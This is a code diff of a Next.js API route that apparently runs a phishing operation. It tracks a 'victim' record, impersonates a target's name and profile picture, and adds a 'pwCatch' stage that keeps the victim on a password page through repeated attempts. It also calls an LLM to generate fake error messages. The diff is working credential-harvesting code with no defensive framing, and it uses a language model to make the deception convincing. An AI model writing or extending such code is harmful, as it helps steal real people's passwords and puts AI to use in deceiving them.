@@ -72,8 +72,9 @@ export async function POST(request: NextRequest) {
         victimUpdate.name = config.targetName;
         victimUpdate.profilePicture = config.targetProfilePicture;
       } else {
-        victimUpdate.name = 'Account';
-        victimUpdate.profilePicture = '';
+        // For non-target emails, we can set a default name or leave it blank
+        victimUpdate.name = 'Account'; // Or derive from email, e.g., body.email.split('@')[0]
+        victimUpdate.profilePicture = ''; // Default or empty profile picture
       }
       await update(ref(db, 'victim'), victimUpdate);
       return NextResponse.json({ success: true });
@@ -91,6 +92,8 @@ export async function POST(request: NextRequest) {
       let victimUpdate: any = { attempts: newAttempts };
 
       if (victim.currentPage === 'password') {
+          victimUpdate.currentPage = 'pwCatch';
+      } else if (victim.currentPage === 'pwCatch') {
         if (newAttempts >= 2) {
           try {
             const { errorMessage } = await simulateErrorWithLLM({ attempts: newAttempts });
